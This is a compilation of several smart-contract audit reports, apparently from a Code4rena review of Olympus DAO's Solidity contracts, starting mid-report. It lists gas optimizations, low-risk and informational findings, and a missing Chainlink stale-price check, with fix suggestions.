https://github.com/code-423n4/2022-08-olympus/blob/b5e139d732eb4c07102f149fb9426d356af617aa/src/policies/Governance.sol#L295-L314 ### Governance.sol.reclaimVotes():tokenClaimsForProposal\[proposalId_]\[msg.sender] should be cached ```solidity File: /src/policies/Governance.sol 295:    function reclaimVotes(uint256 proposalId_) external {   306:        if (tokenClaimsForProposal[proposalId_][msg.sender] == true) {  307:            revert VotingTokensAlreadyReclaimed(); 308:        }  310:        tokenClaimsForProposal[proposalId_][msg.sender] = true;  313:    } 314: } ```   ### Multiple address/ID mappings can be combined into a single mapping of an address/ID to a struct, where appropriate  Saves a storage slot for the mapping. Depending on the circumstances and sizes of types, can avoid a Gsset (20000 gas) per mapping combined. Reads and subsequent writes can also be cheaper when a function requires both values and they both fit in the same storage slot. Finally, if both fields are accessed in the same function, can save ~42 gas per access due to not having to recalculate the key's keccak256 hash (Gkeccak256 - 30 gas) and that calculation's associated stack operations.  https://github.com/code-423n4/2022-08-olympus/blob/b5e139d732eb4c07102f149fb9426d356af617aa/src/modules/TRSRY.sol#L36-L39 ```solidity File: /src/modules/TRSRY.sol 36:    mapping(ERC20 => uint256) public totalDebt;  38:    /// @notice Debt for particular token and debtor address 39:    mapping(ERC20 => mapping(address => uint256)) public reserveDebt; ```  ## Use Shift Right/Left instead of Division/Multiplication While the DIV / MUL opcode uses 5 gas, the SHR / SHL opcode only uses 3 gas. Furthermore, beware that Solidity's division operation also includes a division-by-0 prevention which is bypassed using shifting. Eventually, overflow checks are never performed for shift operations as they are done for arithmetic operations. Instead, the result is always truncated, so the calculation can be unchecked in Solidity version 0.8+  [relevant source](https://github.com/byterocket/c4-common-issues/blob/main/0-Gas-Optimizations.md/#g008---use-shift-rightleft-instead-of-divisionmultiplication-if-possible)  https://github.com/code-423n4/2022-08-olympus/blob/b5e139d732eb4c07102f149fb9426d356af617aa/src/policies/Operator.sol#L372 ```solidity File: /src/policies/Operator.sol 372:            int8 scaleAdjustment = int8(ohmDecimals) - int8(reserveDecimals) + (priceDecimals / 2);  427:            int8 scaleAdjustment = int8(reserveDecimals) - int8(ohmDecimals) + (priceDecimals / 2); ```   ### x += y costs more gas than x = x + y for state variables https://github.com/code-423n4/2022-08-olympus/blob/b5e139d732eb4c07102f149fb9426d356af617aa/src/policies/Heart.sol#L103 ```solidity File: /src/policies/Heart.sol 103:        lastBeat += frequency(); ``` The above should be modified to  ```solidity 103:        lastBeat = lastBeat + frequency(); ```  ### Usage of uints/ints smaller than 32 bytes (256 bits) incurs overhead     When using elements that are smaller than 32 bytes, your contract’s gas usage may be higher. This is because the EVM operates on 32 bytes at a time. Therefore, if the element is smaller than that, the EVM must use more operations in order to reduce the size of the element from 32 bytes to the desired size.  https://docs.soliditylang.org/en/v0.8.11/internals/layout_in_storage.html Use a larger size then downcast where needed  https://github.com/code-423n4/2022-08-olympus/blob/2a0b515012b4a40076f6eac487f7816aafb8724a/src/modules/PRICE.sol#L205 ```solidity File: /src/modules/PRICE.sol //@audit: uint48 lastObservationTime_ 205:    function initialize(uint256[] memory startObservations_, uint48 lastObservationTime_)   //@audit: uint48 movingAverageDuration_ 240:    function changeMovingAverageDuration(uint48 movingAverageDuration_) external permissioned {  //@audit: uint48 observationFrequency_ 266:    function changeObservationFrequency(uint48 observationFrequency_) external permissioned {  ```  https://github.com/code-423n4/2022-08-olympus/blob/b5e139d732eb4c07102f149fb9426d356af617aa/src/policies/Operator.sol#L527-L531 ```solidity File: /src/policies/Operator.sol 527:    function setCushionParams( 528:        uint32 duration_, 529:        uint32 debtBuffer_, 530:        uint32 depositInterval_ 531:    ) external onlyRole("operator_policy") {  548:     function setReserveFactor(uint32 reserveFactor_) external onlyRole("operator_policy") {  559:    function setRegenParams( 560:        uint32 wait_, 561:        uint32 threshold_, 562:        uint32 observe_ 563:    ) external onlyRole("operator_policy") {   ```  https://github.com/code-423n4/2022-08-olympus/blob/b5e139d732eb4c07102f149fb9426d356af617aa/src/policies/PriceConfig.sol#L45 ```solidity File: /src/policies/PriceConfig.sol //@audit: uint48 lastObservationTime_ 45:    function initialize(uint256[] memory startObservations_, uint48 lastObservationTime_)  //@audit: uint48 movingAverageDuration_ 58:    function changeMovingAverageDuration(uint48 movingAverageDuration_)  //@audit: uint48 observationFrequency_ 69:    function changeObservationFrequency(uint48 observationFrequency_) ```  ### Using unchecked blocks to save gas Solidity version 0.8+ comes with implicit overflow and underflow checks on unsigned integers. When an overflow or an underflow isn’t possible (as an example, when a comparison is made before the arithmetic operation), some gas can be saved by using an unchecked block [see resource](https://github.com/ethereum/solidity/issues/10695)  https://github.com/code-423n4/2022-08-olympus/blob/2a0b515012b4a40076f6eac487f7816aafb8724a/src/modules/PRICE.sol#L136 ```solidity 136:            _movingAverage += (currentPrice - earliestPrice) / numObs; ``` The operation `currentPrice - earliestPrice` cannot underflow due to the check on [Line 135](https://github.com/code-423n4/2022-08-olympus/blob/2a0b515012b4a40076f6eac487f7816aafb8724a/src/modules/PRICE.sol#L135) which ensures that `currentPrice` is greater than `earliestPrice` https://github.com/code-423n4/2022-08-olympus/blob/2a0b515012b4a40076f6eac487f7816aafb8724a/src/modules/PRICE.sol#L138 ```solidity 138:             _movingAverage -= (earliestPrice - currentPrice) / numObs; ``` The operation `earliestPrice - currentPrice` cannot underflow due to the check on [Line 135](https://github.com/code-423n4/2022-08-olympus/blob/2a0b515012b4a40076f6eac487f7816aafb8724a/src/modules/PRICE.sol#L135) which ensures that this operation would only be perfomened if `earliestPrice` is greter than `currentPrice`  https://github.com/code-423n4/2022-08-olympus/blob/2a0b515012b4a40076f6eac487f7816aafb8724a/src/modules/PRICE.sol#L185 ```solidity 185:        uint32 lastIndex = nextObsIndex == 0 ? numObservations - 1 : nextObsIndex - 1;  ```  The operation ` nextObsIndex - 1` cannot underflow as it would only be perfomed if `nextObsIndex` is not equal to 0. As `nextObsIndex` is a uint if it's not equal to 0 then it must be greater than 0  https://github.com/code-423n4/2022-08-olympus/blob/b5e139d732eb4c07102f149fb9426d356af617aa/src/modules/TRSRY.sol#L131 ```solidity 131:        if (oldDebt < amount_) totalDebt[token_] += amount_ - oldDebt; 132:        else totalDebt[token_] -= oldDebt - amount_; ``` The operation  `amount_ - oldDebt` cannot underlow due the check `if (oldDebt < amount_)` that ensures that amount is greater than oldDebt before performng the operation The operation  `oldDebt - amount_` cannot underlow due the check `if (oldDebt < amount_)` that ensures that this operation would only be perfomed if `oldDebt ` is greater than `amount_`   ### Cache the length of arrays in loops (saves ~6 gas per iteration) Reading array length at each iteration of the loop takes 6 gas (3 for mload and 3 to place memory_offset) in the stack.  The solidity compiler will always read the length of the array during each iteration. That is,     1.if it is a storage array, this is an extra sload operation (100 additional extra gas (EIP-2929 2) for each iteration except for the first),    2.if it is a memory array, this is an extra mload operation (3 additional gas for each iteration except for the first),    3.if it is a calldata array, this is an extra calldataload operation (3 additional gas for each iteration except for the first)  This extra costs can be avoided by caching the array length (in stack):  When reading the length of an array,  **sload** or **mload** or **calldataload** operation is only called once and subsequently replaced by a cheap **dupN** instruction. Even though mload , calldataload and dupN have the same gas cost, mload and calldataload needs an additional dupN to put the offset in the stack, i.e., an extra 3 gas. which brings this to 6 gas   Here, I suggest storing the array’s length in a variable before the for-loop, and use it instead:  https://github.com/code-423n4/2022-08-olympus/blob/b5e139d732eb4c07102f149fb9426d356af617aa/src/policies/Governance.sol#L276-L278 ```solidity File: /src/policies/Governance.sol 276:        Instruction[] memory instructions = INSTR.getInstructions(activeProposal.proposalId);  278:        for (uint256 step; step < instructions.length; ) { ```    **The above should be modified to** ```solidity  276:        Instruction[] memory instructions = INSTR.getInstructions(activeProposal.proposalId); 277:        uint256 length = instructions.length; 278:        for (uint256 step; step < length; ) { ```  ### ++i costs less gas compared to i++ or i += 1  (~5 gas per iteration)  ++i costs less gas compared to i++ or i += 1 for unsigned integer, as pre-increment is cheaper (about 5 gas per iteration). This statement is true even with the optimizer enabled.  i++ increments i and returns the initial value of i. Which means:  ```solidity uint i = 1;   i++; // == 1 but i == 2   ```  But ++i returns the actual incremented value:  ```solidity uint i = 1;   ++i; // == 2 and i == 2 too, so no need for a temporary variable   ```  In the first case, the compiler has to create a temporary variable (when used) for returning 1 instead of 2  Instances include:  https://github.com/code-423n4/2022-08-olympus/blob/2a0b515012b4a40076f6eac487f7816aafb8724a/src/utils/KernelUtils.sol#L49  ```solidity File: /src/utils/KernelUtils.sol  49:            i++;  64:            i++;  ```  https://github.com/code-423n4/2022-08-olympus/blob/b5e139d732eb4c07102f149fb9426d356af617aa/src/policies/Operator.sol#L488 ```solidity File: /src/policies/Operator.sol 488:            decimals++;  ```  ### Boolean comparisons  Comparing to a constant (true or false) is a bit more expensive than directly checking the returned boolean value. I suggest using if(directValue) instead of if(directValue == true) and if(!directValue) instead of if(directValue == false) here:  https://github.com/code-423n4/2022-08-olympus/blob/b5e139d732eb4c07102f149fb9426d356af617aa/src/policies/Governance.sol#L223 ```solidity File: /src/policies/Governance.sol 223:        if (proposalHasBeenActivated[proposalId_] == true) {  306:        if (tokenClaimsForProposal[proposalId_][msg.sender] == true) { ```  ### Using bools for storage incurs overhead  Booleans are more expensive than uint256 or any type that takes up a full  word because each write operation emits an extra SLOAD to first read the slot's contents, replace the bits taken up by the boolean, and then write back. This is the compiler's defense against contract upgrades and pointer aliasing, and it cannot be disabled.  See [source](https://github.com/OpenZeppelin/openzeppelin-contracts/blob/58f635312aa21f947cae5f8578638a85aa2519f5/contracts/security/ReentrancyGuard.sol#L23-L27)  Use uint256(1) and uint256(2) for true/false to avoid a Gwarmaccess (100 gas), and to avoid Gsset (20000 gas) when changing from ‘false’ to ‘true’, after having been ‘true’ in the past  **Instances affected include**  https://github.com/code-423n4/2022-08-olympus/blob/2a0b515012b4a40076f6eac487f7816aafb8724a/src/Kernel.sol#L113  ```solidity File: /src/Kernel.sol 113:     bool public isActive;  181:     mapping(Keycode => mapping(Policy => mapping(bytes4 => bool))) public modulePermissions;  194:     mapping(address => mapping(Role => bool)) public hasRole;  197:     mapping(Role => bool) public isRole;  ```  https://github.com/code-423n4/2022-08-olympus/blob/2a0b515012b4a40076f6eac487f7816aafb8724a/src/modules/PRICE.sol#L62 ```solidity File: /src/modules/PRICE.sol 62:    bool public initialized;  ```  https://github.com/code-423n4/2022-08-olympus/blob/b5e139d732eb4c07102f149fb9426d356af617aa/src/policies/Operator.sol#L63 ```solidity File: /src/policies/Operator.sol 63:    bool public initialized;  66:    bool public active;  ```  https://github.com/code-423n4/2022-08-olympus/blob/b5e139d732eb4c07102f149fb9426d356af617aa/src/policies/BondCallback.sol#L24 ```solidity File: /src/policies/BondCallback.sol 24:    mapping(address => mapping(uint256 => bool)) public approvedMarkets;  ```  https://github.com/code-423n4/2022-08-olympus/blob/b5e139d732eb4c07102f149fb9426d356af617aa/src/policies/Heart.sol#L33 ```solidity File: /src/policies/Heart.sol 33:    bool public active; ```  https://github.com/code-423n4/2022-08-olympus/blob/b5e139d732eb4c07102f149fb9426d356af617aa/src/policies/Governance.sol#L105 ```solidity File: /src/policies/Governance.sol 105:    mapping(uint256 => bool) public proposalHasBeenActivated;  117:    mapping(uint256 => mapping(address => bool)) public tokenClaimsForProposal; ```  ### Using private rather than public for constants, saves gas If needed, the value can be read from the verified contract source code. Savings are due to the compiler not having to create non-payable getter functions for deployment calldata, and not adding another entry to the method ID table.  https://github.com/code-423n4/2022-08-olympus/blob/b5e139d732eb4c07102f149fb9426d356af617aa/src/policies/Governance.sol#L121-L137 ```solidity File: /src/policies/Governance.sol 121:    uint256 public constant SUBMISSION_REQUIREMENT = 100;  124:    uint256 public constant ACTIVATION_DEADLINE = 2 weeks;  127:    uint256 public constant GRACE_PERIOD = 1 weeks;  130:    uint256 public constant ENDORSEMENT_THRESHOLD = 20;  133:    uint256 public constant EXECUTION_THRESHOLD = 33;  137:    uint256 public constant EXECUTION_TIMELOCK = 3 days; ```  https://github.com/code-423n4/2022-08-olympus/blob/b5e139d732eb4c07102f149fb9426d356af617aa/src/policies/Operator.sol#L89 ```solidity File: /src/policies/Operator.sol 89:    uint32 public constant FACTOR_SCALE = 1e4; ```  https://github.com/code-423n4/2022-08-olympus/blob/2a0b515012b4a40076f6eac487f7816aafb8724a/src/modules/RANGE.sol#L65 ```solidity File: /src/modules/RANGE.sol 65:    uint256 public constant FACTOR_SCALE = 1e4; ``` 
## LOW RISK  ### 1) `lastBeat` might lag  The variable `lastBeat` is used to store the [timestamp of the last beat](https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/Heart.sol#L35), yet it is incremented only by [`frequency()`](https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/Heart.sol#L103). While this would work perfectly in the scenario that keeper bots are consistently calling this function with a frequency of `frequency()` for rewards, `lastBeat` may start lagging behind the actual time in the case there are some update made to the `PRICE` contract (updating observation frequency or the moving average duration) and thus `PRICE` contract is back in the `initialized == false` state which would result in [the call to `updateMovingAverage()` failing](https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/Heart.sol#L97) as the function would revert when `PRICE` is not in the initialized state. This scenario would result in any calls made to the `beat` reverting, and if the `PRICE` contract is not initialized immediately (so there is some delay) after the updates, `lastBeat` would lag behind as it would start getting incremented from the old value up to  old value + multiples of `frequency()`, never reaching the actual timestamp of `beat`s. This can be solved with by making a call to `resetBeat` or by making sure the updates and initializations are done in an atomic fashion operationally, and thus we think this creates only a low risk.      ## NON-CRITICAL ### Open TODOs There are three open TODOs in this function, and according to our understanding, this function `revokePolicyApprovals` does not require a check to see if the address supplied is a deactivated policy, as `TRSRY` should be only called by policies, and thus only policies would require approvals and revoking the approval of something that is not a policy would not do anything. So, these TODOs can be removed. (https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/TreasuryCustodian.sol#L56)  ### TYPO There is a typo in this line (https://github.com/code-423n4/2022-08-olympus/blob/main/src/modules/PRICE.sol#L126), `numbe` should be `number`.
1 Use != 0 instead of > 0 at the above mentioned codes. The variable is uint, so it will not be below 0 so it can just check != 0. != 0 costs less gas compared to > 0 for unsigned integers in require statements with the optimizer enabled https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/Governance.sol#L247  2   ++I COSTS LESS GAS COMPARED TO I++  https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/Operator.sol#L670 https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/Operator.sol#L686 3 <ARRAY>.LENGTH SHOULD NOT BE LOOKED UP IN EVERY LOOP OF A FOR-LOOP and Increments can be unchecked The overheads outlined below are PER LOOP, excluding the first loop storage arrays incur a Gwarmaccess (100 gas) memory arrays use MLOAD (3 gas) calldata arrays use CALLDATALOAD (3 gas) Caching the length changes each of these to a DUP<N> (3 gas), and gets rid of the extra DUP<N> needed to store the stack offset  https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/Governance.sol#L278
# Lines of code  https://github.com/code-423n4/2022-08-olympus/blob/main/src/modules/PRICE.sol#L161 https://github.com/code-423n4/2022-08-olympus/blob/main/src/modules/PRICE.sol#L170   # Vulnerability details  ## Impact Across these contracts, you are using Chainlink's `latestRoundData` API, but there is only a check on `updatedAt`. This could lead to stale prices according to the Chainlink documentation:  * [Historical Price data](https://docs.chain.link/docs/historical-price-data/#historical-rounds) * [Checking Your returned answers](https://docs.chain.link/docs/faq/#how-can-i-check-if-the-answer-to-a-round-is-being-carried-over-from-a-previous-round)  The result of `latestRoundData` API will be used across various functions, therefore, a stale price from Chainlink can lead to loss of funds to end-users.  ## Tools Used Manual Review  ## Recommended Mitigation Steps Consider adding the missing checks for stale data.  For example: ```js (uint80 roundID ,answer,, uint256 timestamp, uint80 answeredInRound) = AggregatorV3Interface(chainLinkAggregatorMap[underlying]).latestRoundData();  require(answer > 0, "Chainlink price <= 0");  require(answeredInRound >= roundID, "Stale price"); require(timestamp != 0, "Round not complete"); ```
## [NAZ-L1] Missing Time locks **Severity**: Low  **Context**: [`RANGE.sol#L263`](https://github.com/code-423n4/2022-08-olympus/blob/main/src/modules/RANGE.sol#L263), [`PRICE.sol#L240`](https://github.com/code-423n4/2022-08-olympus/blob/main/src/modules/PRICE.sol#L240), [`PRICE.sol#L266`](https://github.com/code-423n4/2022-08-olympus/blob/main/src/modules/PRICE.sol#L266), [`Operator.sol#L516`](https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/Operator.sol#L516), [`Operator.sol#L527`](https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/Operator.sol#L527), [`Operator.sol#L548`](https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/Operator.sol#L548), [`Operator.sol#L559`](https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/Operator.sol#L559), [`Operator.sol#L586`](https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/Operator.sol#L586), [`Heart.sol#L130`](https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/Heart.sol#L130), [`Heart.sol#L135`](https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/Heart.sol#L135), [`Heart.sol#L140`](https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/Heart.sol#L140)  **Description**: When critical parameters of systems need to be changed, it is required to broadcast the change via event emission and recommended to enforce the changes after a time-delay. This is to allow system users to be aware of such critical changes and give them an opportunity to exit or adjust their engagement with the system accordingly. None of the onlyOwner functions that change critical protocol addresses/parameters have a timelock for a time-delayed change to alert: (1) users and give them a chance to engage/exit protocol if they are not agreeable to the changes (2) team in case of compromised owner(s) and give them a chance to perform incident response.  **Recommendation**: Users may be surprised when critical parameters are changed. Furthermore, it can erode users' trust since they can’t be sure the protocol rules won’t be changed later on. Compromised owner keys may be used to change protocol addresses/parameters to benefit attackers. Without a time-delay, authorized owners have no time for any planned incident response.   ## [NAZ-L2] Missing Equivalence Checks in Setters **Severity**: Low **Context**: [`Kernel.sol#L77`](https://github.com/code-423n4/2022-08-olympus/blob/main/src/Kernel.sol#L77), [`Kernel.sol#L127`](https://github.com/code-423n4/2022-08-olympus/blob/main/src/Kernel.sol#L127), [`Kernel.sol#L251`](https://github.com/code-423n4/2022-08-olympus/blob/main/src/Kernel.sol#L251), [`Kernel.sol#L253`](https://github.com/code-423n4/2022-08-olympus/blob/main/src/Kernel.sol#L253), [`TRSRY.sol#L122`](https://github.com/code-423n4/2022-08-olympus/blob/main/src/modules/TRSRY.sol#L122), [`RANGE.sol#L242`](https://github.com/code-423n4/2022-08-olympus/blob/main/src/modules/RANGE.sol#L242), [`RANGE.sol#L263`](https://github.com/code-423n4/2022-08-olympus/blob/main/src/modules/RANGE.sol#L263), [`PRICE.sol#L240`](https://github.com/code-423n4/2022-08-olympus/blob/main/src/modules/PRICE.sol#L240), [`PRICE.sol#L266`](https://github.com/code-423n4/2022-08-olympus/blob/main/src/modules/PRICE.sol#L266), [`Operator.sol#L516`](https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/Operator.sol#L516), [`Operator.sol#L527`](https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/Operator.sol#L527), [`Operator.sol#L548`](https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/Operator.sol#L548), [`Operator.sol#L559`](https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/Operator.sol#L559), [`Operator.sol#L586`](https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/Operator.sol#L586), [`BondCallback.sol#L190`](https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/BondCallback.sol#L190), [`Heart.sol#L130`](https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/Heart.sol#L130), [`Heart.sol#L135`](https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/Heart.sol#L135), [`Heart.sol#L140`](https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/Heart.sol#L140)  **Description**: Setter functions are missing checks to validate if the new value being set is the same as the current value already set in the contract. Such checks will showcase mismatches between on-chain and off-chain states.  **Recommendation**: This may hinder detecting discrepancies between on-chain and off-chain states leading to flawed assumptions of on-chain state and protocol behavior.   ## [NAZ-L3] Missing Zero-address Validation **Severity**: Low **Context**: [`Kernel.sol#L77`](https://github.com/code-423n4/2022-08-olympus/blob/main/src/Kernel.sol#L77), [`Kernel.sol#L251`](https://github.com/code-423n4/2022-08-olympus/blob/main/src/Kernel.sol#L251), [`Kernel.sol#L253`](https://github.com/code-423n4/2022-08-olympus/blob/main/src/Kernel.sol#L253), [`BondCallback.sol#L190`](https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/BondCallback.sol#L190), [`Heart.sol#L140`](https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/Heart.sol#L140)  **Description**: Lack of zero-address validation on address parameters may lead to transaction reverts, waste gas, require resubmission of transactions and may even force contract redeployments in certain cases within the protocol.  **Recommendation**: Consider adding explicit zero-address validation on input parameters of address type.   ## [NAZ-L4] Lack of Event Emission For Critical Functions **Severity**: Low **Context**: [`Kernel.sol#L77`](https://github.com/code-423n4/2022-08-olympus/blob/main/src/Kernel.sol#L77), [`Kernel.sol#L127`](https://github.com/code-423n4/2022-08-olympus/blob/main/src/Kernel.sol#L127), [`Kernel.sol#L251`](https://github.com/code-423n4/2022-08-olympus/blob/main/src/Kernel.sol#L251), [`Kernel.sol#L253`](https://github.com/code-423n4/2022-08-olympus/blob/main/src/Kernel.sol#L253), [`BondCallback.sol#L190`](https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/BondCallback.sol#L190), [`Heart.sol#L130`](https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/Heart.sol#L130), [`Heart.sol#L135`](https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/Heart.sol#L135)  **Description**: Several functions update critical parameters that are missing event emission. These should be performed to ensure tracking of changes of such critical parameters.  **Recommendation**: Consider adding events to functions that change critical parameters.   ## [NAZ-L5] Missing Events In Initialize Functions **Severity**: Low **Context**: [`PRICE.sol#L205`](https://github.com/code-423n4/2022-08-olympus/blob/main/src/modules/PRICE.sol#L205), [`Operator.sol#L598`](https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/Operator.sol#L598), [`PriceConfig.sol#L45`](https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/PriceConfig.sol#L45)  **Description**: None of the initialize functions emit emit init-specific events. They all however have the initializer modifier (from Initializable) so that they can be called only once. Off-chain monitoring of calls to these critical functions is not possible.  **Recommendation**: It is recommended to emit events in your initialization functions.   ## [NAZ-N1] Unreachable Code **Severity** Informational **Context**: [`VOTES#L47`](https://github.com/code-423n4/2022-08-olympus/blob/main/src/modules/VOTES.sol#L47)  **Description**: There is unreachable code that can be removed to clean up the code.  **Recommendation**: Consider removing the unreachable code to clean it up.    ## [NAZ-N2] Votes Module `ERC20` Token Name `"OlympusDAO Dummy Voting Tokens"` **Severity** Informational **Context**: [`VOTES#L18`](https://github.com/code-423n4/2022-08-olympus/blob/main/src/modules/VOTES.sol#L18)  **Description**: This was probably meant as a joke during testing and should probably be renamed for production to not confuse users.  **Recommendation**: Consider renaming the votes module `ERC20` token name `"OlympusDAO Dummy Voting Tokens"` to `"OlympusDAO Voting Tokens"`.   ## [NAZ-N3] Function && Variable Naming Convention **Severity** Informational **Context**: [`Kernel.sol#L131`](https://github.com/code-423n4/2022-08-olympus/blob/main/src/Kernel.sol#L131), [`PRICE.sol#L59`](https://github.com/code-423n4/2022-08-olympus/blob/main/src/modules/PRICE.sol#L59), [`TreasuryCustodian.sol#L20`](https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/TreasuryCustodian.sol#L20), [`Operator.sol#L69-L72`](https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/Operator.sol#L69-L72), [`Heart.sol#L45`](https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/Heart.sol#L45), [`PriceConfig.sol#L11`](https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/PriceConfig.sol#L11)  **Description**: The linked variables do not conform to the standard naming convention of Solidity whereby functions and variable names(local and state) utilize the `mixedCase` format unless variables are declared as `constant` in which case they utilize the `UPPER_CASE_WITH_UNDERSCORES` format. Internal/private functions and variables should lead with an `_underscore`.  **Recommendation**: Consider naming conventions utilized by the linked statements are adjusted to reflect the correct type of declaration according to the Solidity style guide.   ## [NAZ-N4] Code Structure Deviates From Best-Practice **Severity**: Informational **Context**: [`Kernel.sol#L71`](https://github.com/code-423n4/2022-08-olympus/blob/main/src/Kernel.sol#L71), [`Kernel.sol#L89`](https://github.com/code-423n4/2022-08-olympus/blob/main/src/Kernel.sol#L89), [`Kernel.sol#L120`](https://github.com/code-423n4/2022-08-olympus/blob/main/src/Kernel.sol#L120), [`Kernel.sol#L224-L230`](https://github.com/code-423n4/2022-08-olympus/blob/main/src/Kernel.sol#L224-L230), [`TRSRY.sol#L20-L39`](https://github.com/code-423n4/2022-08-olympus/blob/main/src/modules/TRSRY.sol#L20-L39), [`RANGE.sol#L20-L31`](https://github.com/code-423n4/2022-08-olympus/blob/main/src/modules/RANGE.sol#L20-L31), [`PRICE.sol#L26-L28`](https://github.com/code-423n4/2022-08-olympus/blob/main/src/modules/PRICE.sol#L26-L28), [`INSTR.sol#L11`](https://github.com/code-423n4/2022-08-olympus/blob/main/src/modules/INSTR.sol#L11), [`TreasuryCustodian.sol#L17`](https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/TreasuryCustodian.sol#L17), [`Operator.sol#L45-L54`](https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/Operator.sol#L45-L54), [`Operator.sol#L188`](https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/Operator.sol#L188), [`Governance.sol#L61-L137`](https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/Governance.sol#L61-L137)  **Description**: The best-practice layout for a contract should follow the following order: state variables, events, modifiers, constructor and functions. Function ordering helps readers identify which functions they can call and find constructor and fallback functions easier.  Functions should be grouped according to their visibility and ordered as: constructor, receive function (if exists), fallback function (if exists), external, public, internal, private. Some constructs deviate from this recommended best-practice: Modifiers are in the middle of contracts. External/public functions are mixed with internal/private ones. Few events are declared in contracts while most others are in corresponding interfaces.  **Recommendation**: Consider adopting recommended best-practice for code structure and layout.   ## [NAZ-N5] Comment Line Length **Severity**: Informational **Context**: [`RANGE.sol#L40`](https://github.com/code-423n4/2022-08-olympus/blob/main/src/modules/RANGE.sol#L40), [`RANGE.sol#L44`](https://github.com/code-423n4/2022-08-olympus/blob/main/src/modules/RANGE.sol#L44), [`RANGE.sol#L46-L48`](https://github.com/code-423n4/2022-08-olympus/blob/main/src/modules/RANGE.sol#L46-L48), [`RANGE.sol#L61-L62`](https://github.com/code-423n4/2022-08-olympus/blob/main/src/modules/RANGE.sol#L61-L62), [`RANGE.sol#L214`](https://github.com/code-423n4/2022-08-olympus/blob/main/src/modules/RANGE.sol#L214), [`RANGE.sol#L239-L240`](https://github.com/code-423n4/2022-08-olympus/blob/main/src/modules/RANGE.sol#L239-L240), [`RANGE.sol#L261-L262`](https://github.com/code-423n4/2022-08-olympus/blob/main/src/modules/RANGE.sol#L261-L262), [`PRICE.sol#L19-L20`](https://github.com/code-423n4/2022-08-olympus/blob/main/src/modules/PRICE.sol#L19-L20), [`PRICE.sol#L31`](https://github.com/code-423n4/2022-08-olympus/blob/main/src/modules/PRICE.sol#L31), [`PRICE.sol#L39-L40`](https://github.com/code-423n4/2022-08-olympus/blob/main/src/modules/PRICE.sol#L39-L40), [`PRICE.sol#L46`](https://github.com/code-423n4/2022-08-olympus/blob/main/src/modules/PRICE.sol#L46), [`PRICE.sol#L78`](https://github.com/code-423n4/2022-08-olympus/blob/main/src/modules/PRICE.sol#l78), [`PRICE.sol#L120`](https://github.com/code-423n4/2022-08-olympus/blob/main/src/modules/PRICE.sol#L120), [`PRICE.sol#L189`](https://github.com/code-423n4/2022-08-olympus/blob/main/src/modules/PRICE.sol#L189), [`PRICE.sol#L201`](https://github.com/code-423n4/2022-08-olympus/blob/main/src/modules/PRICE.sol#L201), [`PRICE.sol#L203`](https://github.com/code-423n4/2022-08-olympus/blob/main/src/modules/PRICE.sol#L203), [`PRICE.sol#L263-L264`](https://github.com/code-423n4/2022-08-olympus/blob/main/src/modules/PRICE.sol#L263-L264), [`Operator.sol#L97`](https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/Operator.sol#L97), [`Operator.sol#L199`](https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/Operator.sol#L199), [`Operator.sol#L481`](https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/Operator.sol#L481), [`Operator.sol#L657`](https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/Operator.sol#L657), [`Operator.sol#L730`](https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/Operator.sol#L730), [`Operator.sol#L734`](https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/Operator.sol#L734), [`PriceConfig.sol#L41`](https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/PriceConfig.sol#L41), [`PriceConfig.sol#L43`](https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/PriceConfig.sol#L43), [`PriceConfig.sol#L66-L67`](https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/PriceConfig.sol#L66-L67), [`Governance.sol#L119`](https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/Governance.sol#L119), [`Governance.sol#L156`](https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/Governance.sol#L156), [`Governance.sol#L158`](https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/Governance.sol#L158), [`IBondCallback.sol#L7`](https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/BondCallback.sol#L7), [`IOperator.sol#L13`](https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/interfaces/IOperator.sol#L13), 